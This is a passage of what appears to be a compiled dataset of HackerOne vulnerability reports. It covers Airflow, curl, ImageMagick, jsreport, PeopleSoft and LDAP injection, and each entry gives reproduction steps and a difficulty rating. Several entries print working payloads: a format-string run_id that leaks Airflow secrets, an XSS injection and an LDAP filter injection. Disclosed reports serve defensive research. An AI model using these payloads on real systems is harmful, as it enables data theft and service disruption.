Exploitation Difficulty:
The attack is straightforward and involves a single, well-documented payload. The steps to reproduce are simple and do not require understanding complex interactions or manipulating application states. The vulnerability is widely known, making its discovery less challenging.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1707287: CVE-2022-40604: Apache Airflow: Format String Vulnerability
================================================================================
Vulnerability Description:
There is a Format String Vulnerability in src/airflow/utils/log/file_task_handler.py. An attacker can control part of the log_relative_path, which is made up of run_id and other things. This allows the attacker to inject format strings and access sensitive information such as secret_key, database connection string, and various configurations.

Steps to Reproduce:
1. Enter the DAGs menu, Choose any DAG, select Trigger DAG w/ config.
2. Set the run_id to {ti.task.__class__.__init__.__globals__[conf].__dict__} and trigger it.
3. Enter the /xcom/list/ page, click to enter the corresponding task page.
4. Click the Log option and capture the packet, you will get a request similar to the following: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=1&metadata=null
5. Modify try_number to a nonexistent value, such as 9999, such as: /get_logs_with_metadata?dag_id=example_xcom&task_id=push_by_returning&map_index=-1&execution_date=2022-08-29T13%3A25%3A11%2B00%3A00&try_number=9999&metadata=null
6. Paste the modified url into the browser for access
Exploitation Difficulty:
The vulnerability involves understanding the format string injection in the context of Apache Airflow's logging mechanism, manipulating the run_id to inject malicious format strings, and then triggering the vulnerability by accessing a modified log URL. The steps require knowledge of the application's internals and the ability to chain multiple actions together.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2819666: Exploitable Format String Vulnerability in curl_mfprintf Function
================================================================================
Vulnerability Description:
The curl_mfprintf function in the curl_printf.h file contains a format string vulnerability that allows an attacker to inject arbitrary format specifiers. This can lead to unauthorized access to memory content, potential application crashes, or leakage of sensitive data.

Steps to Reproduce:
1. Prepare the Test Code: Create a new file named test_printf.c with the specified content
2. Compile the Code: Compile the test program with the given command
3. Execute the Code: Run the compiled program
4. Observe the Output: The output displays memory content, confirming the vulnerability
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a well-known format string vulnerability pattern. The attack does not require multiple components, complex application states, or novel logic. The interaction is obvious and commonly found in other applications.

--------------------------------------------------------------------------------



Remote File Inclusion Vulnerabilities (3 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1858574: [CVE-2022-44268] Arbitrary Remote Leak via ImageMagick
================================================================================
Vulnerability Description:
The vulnerability involves using ImageMagick to convert/resize images, which can be exploited to leak arbitrary files from the server by embedding malicious content in an image file. When the image is processed, the server's file content (e.g., /etc/passwd) is embedded in the output image's metadata, which can then be extracted and decoded.

Steps to Reproduce:
1. Navigate to your profile
2. Edit and upload the attached image (im-lfi.png) as your profile picture
3. Save changes and download the resized picture
4. Issue the following command to view the downloaded image's profile data: identify -verbose image.png
5. Copy the Raw profile type: and decode it using any tool or using Python
Exploitation Difficulty:
This vulnerability requires knowledge of the ImageMagick CVE and how to craft a malicious image file to trigger the file read. However, once the exploit image is created, the steps to reproduce are straightforward and do not involve complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/538771: LFI with potential to RCE on ██████ using CVE-2019-3396
================================================================================
Vulnerability Description:
This vulnerability is a Local File Inclusion (LFI) in a web application that uses a specific macro preview feature. By manipulating the '_template' parameter in the JSON payload, an attacker can read arbitrary files from the server's filesystem. This could potentially lead to Remote Code Execution (RCE) if the attacker can access and manipulate critical files.

Steps to Reproduce:
1. Send a POST request to the vulnerable endpoint with a malicious JSON payload that includes a file path in the '_template' parameter.
2. Observe the server's response, which may include the contents of the specified file, indicating successful Local File Inclusion (LFI).
Exploitation Difficulty:
The attack involves a single straightforward step of crafting a malicious JSON payload and sending it to a known vulnerable endpoint. The interaction is direct and does not require understanding complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/660565: [jsreport] Remote Code Execution
================================================================================
Vulnerability Description:
The vulnerability involves chaining an unintended require vulnerability in the script-manager module with SSRF in the Puppeteer module of jsreport. This allows an attacker to execute arbitrary JavaScript code remotely on the server by first identifying the script-manager's port via SSRF and then sending a crafted request to execute a malicious script.

Steps to Reproduce:
1. Run jsreport as a Docker container: `sudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0`
2. Access the jsreport interface at http://localhost
3. Create a new template named 'test1' with an HTML payload to perform SSRF
4. Use the portScanner.js script to identify the script-manager's vulnerable port
5. Create a malicious script 'pwn.js' to be executed on the server
6. Create another template 'test2' with an HTML payload to exploit the script-manager's port
7. Execute the template to trigger the RCE
Exploitation Difficulty:
The attack involves multiple components (script-manager, Puppeteer, SSRF, port scanning) and requires understanding their interactions. The port scanning technique is non-trivial and involves divide-and-conquer logic. The exploitation requires chaining two vulnerabilities in a novel way to achieve RCE.

--------------------------------------------------------------------------------



Reflected XSS Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/2787650: Reflected XSS on Amazon EC2 Instance
================================================================================
Vulnerability Description:
A reflected XSS vulnerability was discovered on the Amazon EC2 instance, allowing an attacker to inject malicious JavaScript code, potentially leading to unauthorized access to sensitive data or system compromise. The payload is injected into the errorCode parameter, which is reflected back to the user without proper validation or sanitization.

Steps to Reproduce:
1. Navigate to the vulnerable Amazon EC2 instance URL with the errorCode parameter.
2. Inject the malicious JavaScript payload into the errorCode parameter: ███████);alert(document.domain)//
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves a simple injection of JavaScript code into a URL parameter, which is a common and well-documented attack vector. The attack does not require multiple components, complex application states, or novel logic.

--------------------------------------------------------------------------------



XML External Entities (XXE) Vulnerabilities (1 reports)
--------------------------------------------------

Report https://hackerone.com/reports/710654: XXE with RCE potential on the https://█████████ (CVE-2017-3548)
================================================================================
Vulnerability Description:
This vulnerability is an XML External Entity (XXE) injection in Oracle PeopleSoft (CVE-2017-3548) that allows an attacker to create arbitrary Apache Axis services on the server, potentially leading to Remote Code Execution (RCE) and internal network access.

Steps to Reproduce:
1. Send a crafted XML POST request to the target endpoint /PSIGW/PeopleSoftServiceListeningConnector with an XXE payload that references the local AdminService.
2. Observe the creation of a new service (h1testservice) at the specified endpoint, confirming the XXE vulnerability and potential for RCE.
Exploitation Difficulty:
The attack involves understanding XXE vulnerabilities, crafting a specific XML payload to interact with the AdminService, and leveraging the Apache Axis service deployment mechanism. While the components (XXE, Axis service deployment) are known, combining them to achieve RCE requires some expertise and knowledge of the target system.

--------------------------------------------------------------------------------



LDAP Injection Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/906959: [cloudron-surfer] Denial of Service via LDAP Injection
================================================================================
Vulnerability Description:
The cloudron-surfer module is vulnerable to a Denial of Service via LDAP Injection. An attacker can send a malformed input that is interpreted as an LDAP filter, leading to excessive resource consumption and server crashes.

Steps to Reproduce:
1. Install Cloudron and the Surfer app or set up a local test environment with the cloudron-surfer module and LDAP test server.
2. Send a crafted LDAP injection payload (e.g., '*)(cn=*)' repeated multiple times) as the username during login to trigger a Denial of Service.
Exploitation Difficulty:
The vulnerability involves understanding LDAP injection techniques and crafting a payload that exploits the lack of input sanitization in the LDAP filter construction. However, the attack is straightforward once the LDAP injection vector is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/907311: [meemo-app] Denial of Service via LDAP Injection
================================================================================
Vulnerability Description:
The vulnerability is a Denial of Service (DoS) via LDAP Injection in the meemo-app module. It occurs when a malicious attacker sends a crafted input that is interpreted as an LDAP filter, causing the server to consume excessive resources and crash.

Steps to Reproduce:
1. Set up a local environment with MongoDB, Meemo app, and LDAP test server
2. Send a crafted LDAP injection payload to the login endpoint to trigger the DoS
Exploitation Difficulty:
The attack involves setting up multiple components (MongoDB, Meemo app, LDAP server) and crafting a specific LDAP injection payload. However, the LDAP injection technique is well-known and the steps to reproduce are straightforward once the environment is set up.

--------------------------------------------------------------------------------



